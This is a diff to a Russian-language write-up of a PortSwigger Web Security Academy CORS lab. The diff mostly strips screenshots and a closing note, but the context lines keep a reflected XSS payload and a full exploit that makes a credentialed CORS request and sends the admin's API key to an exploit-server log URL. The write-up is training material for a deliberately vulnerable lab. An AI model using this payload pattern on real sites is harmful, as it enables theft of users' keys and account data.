@@ -1,4 +1,4 @@
-# CORS Vulnerability with Trusted Insecure Protocols (PortSwigger Web Security Academy — WEB)
+# CORS Vulnerability with Trusted Insecure Protocols 
 
 > **Категория:** Web
 > **Сложность:** Practitioner
@@ -13,9 +13,6 @@
 > Сайт имеет небезопасную конфигурацию CORS: он доверяет **любому поддомену** `*.web-security-academy.net`, независимо от протокола (HTTP или HTTPS). В теории такую уязвимость эксплуатируют через атаку man-in-the-middle: злоумышленник перехватывает HTTP-трафик жертвы к доверенному поддомену и подменяет ответ на свой, с вредоносным JavaScript. В условиях лабы реальный перехват трафика недоступен, поэтому нужно найти **альтернативный способ** выполнить свой код в контексте доверенного поддомена.
 >
 > Цель: с помощью CORS украсть API-ключ администратора и отправить его в форму решения лабы.
-
-![Условие задания](./images/image1.png)
-*Скриншот условия лабы*
 
 ---
 
@@ -57,9 +54,6 @@ Invalid product ID: <script>
     alert(1)
 </script>
 ```
-
-![Подтверждение отражённой XSS в productId](./images/image2.png)
-*Отражённая XSS на HTTP-поддомене stock через параметр productId*
 
 Это и есть замена шагу MITM: **отражённая XSS на доверенном HTTP-поддомене**, которая позволяет выполнить произвольный JS в происхождении `http://stock.<LAB-ID>.web-security-academy.net` — том самом, которому доверяет основной сайт.
 
@@ -107,9 +101,6 @@ function reqListener(){
 <script>document.location = "http://stock.<LAB-ID>.web-security-academy.net/?productId=%3cscript%3evar req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://<LAB-ID>.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener(){location = ('https://<EXPLOIT-ID>.exploit-server.net/log?key='%2bthis.responseText);}%3c/script%3e&storeId=1";</script>
 ```
 
-![Итоговый payload на exploit server](./images/image3.png)
-*Body на exploit server*
-
 **4. Проверил через "View exploit"**
 
 Payload сработал на собственном аккаунте (wiener:peter) — браузер ушёл на `stock...`, выполнился внедрённый скрипт, CORS-запрос к `/accountDetails` прошёл с cookie, и браузер приземлился на `/log?key=...` с моим собственным ключом в URL.
@@ -118,23 +109,13 @@ Payload сработал на собственном аккаунте (wiener:pe
 
 Нажал **Deliver exploit to victim**, подождал несколько секунд и проверил **Access log**.
 
-![Access log с ключом администратора](./images/image4.png)
-*Лог exploit server с перехваченным API-ключом администратора*
-
 **6. Отправил ключ в форму решения лабы**
 
 ```
 <ADMIN_API_KEY>
 ```
 
-![Лаба решена](./images/image5.png)
-*Успешное решение лабы*
-
 ---
-
-## Примечание
-
-В этой лабе роль MITM-перехвата, который используется в теоретическом описании атаки, фактически исполняет **реальная уязвимость — отражённая XSS** на доверенном HTTP-поддомене. Это хороший пример того, как учебная модель атаки («перехват трафика») в боевых условиях часто заменяется на конкретный баг с тем же эффектом: возможностью выполнить свой код в доверенном происхождении.
 
 ---
 
